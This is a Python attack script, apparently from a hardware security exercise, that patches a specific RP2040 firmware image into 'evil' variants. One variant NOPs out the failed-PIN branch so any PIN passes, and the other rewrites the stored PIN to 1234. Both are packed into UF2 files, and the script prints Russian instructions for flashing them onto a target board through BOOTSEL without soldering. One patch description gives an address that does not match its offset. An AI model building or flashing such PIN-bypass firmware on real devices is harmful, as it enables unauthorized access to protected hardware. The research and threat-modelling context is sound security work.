#!/usr/bin/env python3
"""Build two RP2040 firmware variants from the code in reversing/program.bin

The anypin variant removes one conditional branch
The pin1234 variant changes the PIN bytes in read-only flash data
See attack6/README.md for the threat model and proof limits
"""
import struct
import sys
from pathlib import Path

UF2_MAGIC_START0 = 0x0A324655          # "UF2\n"
UF2_MAGIC_START1 = 0x9E5D5157
UF2_MAGIC_END    = 0x0AB16F30
UF2_FLAG_FAMILY  = 0x00002000
RP2040_FAMILY_ID = 0xE48BFF56
FLASH_BASE       = 0x10000000

PATCHES = {
    "anypin": [(
        0xC8C,
        bytes([0x22, 0xD1]),
        bytes([0x00, 0xBF]),
        "0x10000c8c: bne fail -> nop",
    )],
    "pin1234": [(
        0x5500,
        bytes([0x03, 0x09, 0x05, 0x02]),
        bytes([0x01, 0x02, 0x03, 0x04]),
        "0x100054FF: PIN 3952 -> 1234",
    )],
}


def patch_image(original, name):
    if name not in PATCHES:
        raise ValueError(f"Unknown firmware variant: {name}")
    image = bytearray(original)
    for off, old, new, _ in PATCHES[name]:
        if bytes(image[off:off + len(old)]) != old:
            raise ValueError(f"Source firmware differs at offset 0x{off:x}")
        image[off:off + len(new)] = new
    return bytes(image)


def verify_disasm(image, patches, name):
    """Show the modified branch; PIN reference bytes are data, not instructions"""
    if name != "anypin":
        return
    try:
        import capstone
    except ImportError:
        print("  Capstone is unavailable; run demo.py to verify the PIN behavior")
        return
    md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_THUMB | capstone.CS_MODE_MCLASS)
    for off, old, new, desc in patches:
        lo, hi = off - 8, off + max(len(old), len(new)) + 8
        print(f"  [{name}] {desc}")
        for ins in md.disasm(image[lo:hi], FLASH_BASE + lo):
            mark = " <-" if lo <= ins.address - FLASH_BASE < lo + max(len(old), len(new)) else "   "
            print(f"    {mark} {ins.address:08X}  {ins.mnemonic:8s} {ins.op_str}")


def make_uf2(image, family=RP2040_FAMILY_ID):
    """Encode the image as 256-byte UF2 payload blocks"""
    chunks = [image[i:i + 256] for i in range(0, len(image), 256)]
    nblocks = len(chunks)
    out = bytearray()
    for no, chunk in enumerate(chunks):
        addr = FLASH_BASE + no * 256
        block = struct.pack("<IIIIIIII",
                            UF2_MAGIC_START0, UF2_MAGIC_START1,
                            UF2_FLAG_FAMILY, addr, len(chunk), no, nblocks, family)
        block += chunk.ljust(476, b"\x00")
        block += struct.pack("<I", UF2_MAGIC_END)
        assert len(block) == 512
        out += block
    return bytes(out)


def sha(data):
    import hashlib
    return hashlib.sha256(data).hexdigest()[:16]


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 1
    with open(argv[1], "rb") as f:
        original = f.read()
    print(f"=== attack6: сборка злых прошивок из {argv[1]} ({len(original)} байт) ===")
    print(f"образ-источник sha256[:16] = {sha(original)}")

    for name, patches in PATCHES.items():
        print(f"\n--- вариант: {name} ---")
        try:
            image = patch_image(original, name)
        except ValueError as error:
            print(f"  {error}", file=sys.stderr)
            return 1
        for off, old, new, desc in patches:
            print(f"  патч 0x{off:04x}: {old.hex(' ')} -> {new.hex(' ')}")

        changed = [(i, original[i], image[i]) for i in range(len(original)) if original[i] != image[i]]
        print(f"  изменённых байт: {len(changed)} -> " +
              ", ".join(f"0x{i:04x}:{o:02x}->{n:02x}" for i, o, n in changed))
        verify_disasm(image, patches, name)

        bin_name = Path(__file__).resolve().parent.parent / "out" / f"evil_{name}.bin"
        uf2_name = Path(__file__).resolve().parent.parent / "out" / f"evil_{name}.uf2"
        for target, content in ((bin_name, image), (uf2_name, make_uf2(image))):
            if target.exists() and target.read_bytes() != content:
                print(f"  Existing artifact differs: {target}", file=sys.stderr)
                return 1
            if not target.exists():
                target.write_bytes(content)
        print(f"  записано: {bin_name} ({len(image)} B, sha256[:16]={sha(image)}), "
              f"{uf2_name} (BOOTSEL drag-and-drop)")
    print("\nготово. Доставка: удержать BOOTSEL на целевой плате, подключить USB, "
          "скопировать .uf2 — прошивка подменится без единого паяльного движения")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
